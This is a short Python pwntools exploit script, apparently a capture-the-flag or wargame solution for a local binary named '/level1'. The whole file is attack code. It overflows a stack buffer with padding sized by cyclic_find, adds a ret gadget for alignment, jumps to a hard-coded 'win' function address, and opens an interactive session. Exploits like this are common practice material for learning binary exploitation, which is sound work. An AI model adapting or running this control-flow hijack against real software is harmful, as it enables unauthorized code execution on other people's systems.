#!/usr/bin/env python3

from pwn import *

# NO ASLR, NO PIE, NX

context.update(arch='amd64', os='linux') # set arch
p = process('/level1')

#gdb.attach(p, '''
#b *main
#b *main+555
#''')

#pattern = cyclic(100, n=8) #n = 8 for x64
overflow_until_ret = b'A' * cyclic_find(0x616161616161616c, n=8)
win_function = p64(0x0000000000401a82)
ret_address = p64(0x0000000000401ad0)

exploit = overflow_until_ret + ret_address + win_function 
p.sendline(exploit)

p.interactive()
